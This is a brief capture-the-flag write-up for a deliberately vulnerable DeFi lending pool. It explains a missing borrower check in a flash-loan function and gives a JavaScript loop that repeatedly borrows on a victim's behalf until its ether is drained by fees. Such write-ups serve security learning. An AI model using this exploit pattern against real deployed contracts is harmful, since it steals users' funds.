# Naive Receiver

1. The `NaiveReceiverLenderPool.sol` has `flashLoan` function with 1 ETH free that does'nt check the borrower address so we can borrow for others people behalf. We can drain the user by calling until the user run out of ether.

```javascript
while ((await ethers.provider.getBalance(this.receiver.address)) > 0) {
  await this.pool.flashLoan(
    this.receiver.address,
    ethers.utils.parseEther("0")
  );
}
```

2. To do it in single transaction, we can create a contract which contain the code that do exactly the same.
